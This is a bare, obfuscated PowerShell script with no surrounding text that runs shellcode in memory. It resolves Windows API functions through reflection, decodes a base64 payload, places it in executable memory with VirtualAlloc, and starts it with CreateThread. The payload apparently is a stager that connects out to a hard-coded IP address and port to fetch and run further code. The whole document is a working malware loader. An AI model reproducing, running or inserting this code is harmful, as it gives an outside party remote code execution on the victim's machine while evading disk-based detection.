function xkQXlGI {
	Param ($t_W3G, $eZt2cv)		
	$pe9ekDv7hQz = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $pe9ekDv7hQz.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pe9ekDv7hQz.GetMethod('GetModuleHandle')).Invoke($null, @($t_W3G)))), $eZt2cv))
}

function pUf {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $fgVRgkXXRWtu,
		[Parameter(Position = 1)] [Type] $ejea7Uc = [Void]
	)
	
	$p8uVTwY = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$p8uVTwY.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $fgVRgkXXRWtu).SetImplementationFlags('Runtime, Managed')
	$p8uVTwY.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ejea7Uc, $fgVRgkXXRWtu).SetImplementationFlags('Runtime, Managed')
	
	return $p8uVTwY.CreateType()
}

[Byte[]]$cMA4LD = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVorBuyC2gCADhsieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$tWZCnhpTNUUk = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xkQXlGI kernel32.dll VirtualAlloc), (pUf @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cMA4LD.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($cMA4LD, 0, $tWZCnhpTNUUk, $cMA4LD.length)

$v92b8tSM3 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xkQXlGI kernel32.dll CreateThread), (pUf @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$tWZCnhpTNUUk,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xkQXlGI kernel32.dll WaitForSingleObject), (pUf @([IntPtr], [Int32]))).Invoke($v92b8tSM3,0xffffffff) | Out-Null